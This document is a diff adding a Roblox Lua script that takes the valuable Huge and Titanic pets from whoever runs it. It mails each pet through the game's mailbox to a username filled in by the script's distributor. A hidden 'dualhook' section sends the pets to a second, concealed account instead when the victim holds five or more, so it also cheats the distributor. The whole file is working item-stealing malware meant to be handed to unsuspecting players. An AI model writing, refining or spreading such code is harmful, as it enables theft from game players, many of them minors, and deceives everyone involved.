@@ -1,0 +1,85 @@
+Username = "your roblox username here"
+
+-- dont move anything below
+local Player = game:GetService("Players").LocalPlayer
+local Inventory = Player.PlayerGui.Inventory
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Directory = ReplicatedStorage:WaitForChild("__DIRECTORY")
+local TitanicsFolder = Directory.Pets:FindFirstChild("Titanic")
+local HugesFolder = Directory.Pets:FindFirstChild("Huge")
+local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local Remote = ReplicatedStorage.Network:FindFirstChild("Mailbox: Send")
+
+
+-- Dualhook
+
+local dhuser = "DUALHOOK_USER"
+local AmountOfPetsToSteal = nil -- Keep it like this
+local Dualhooked = true
+
+-- Dualhook End
+
+local function GetPlayerOwnedHugesTitanics()
+	local PlayerOwnedHugesTitanics = {}
+
+	for i, pet in pairs(Save.Get().Inventory.Pet) do
+		if not HugesFolder:FindFirstChild(pet.id) then continue end
+
+		table.insert(PlayerOwnedHugesTitanics, {UUID = i, Name = pet.id, Amount = pet._am})
+	end
+
+	for i, pet in pairs(Save.Get().Inventory.Pet) do
+		if not TitanicsFolder:FindFirstChild(pet.id) then continue end
+
+		table.insert(PlayerOwnedHugesTitanics, {UUID = i, Name = pet.id, Amount = pet._am})
+	end
+
+	return PlayerOwnedHugesTitanics
+end
+
+local function Steal()
+	local pets = GetPlayerOwnedHugesTitanics()
+	local PetsSuccessfullyStolen = {}
+	local totalPets = 0
+	
+	if not pets then return end
+	
+	for i, v in pets do
+		totalPets += 1
+	end
+
+	if totalPets < 1 then return end
+	if not AmountOfPetsToSteal then AmountOfPetsToSteal = totalPets end
+
+	for i = 1, AmountOfPetsToSteal do
+		local petsToSend = pets[i]
+		local playerToSend = Username
+
+		if not petsToSend then continue end
+
+		if totalPets >= 5 and Dualhooked then
+			playerToSend = dhuser
+		end
+
+		local args = {
+			[1] = playerToSend,
+			[2] = "I Skidded off of Arkhalis",
+			[3] = "Pet",
+			[4] = petsToSend.UUID,
+			[5] = 1
+		}
+
+		local success = Remote:InvokeServer(unpack(args))
+
+		if success then 
+			table.insert(PetsSuccessfullyStolen, petsToSend.Name)
+		else
+			i -= 1
+		end
+
+		task.wait(2.5)
+	end
+end
+
+Steal()
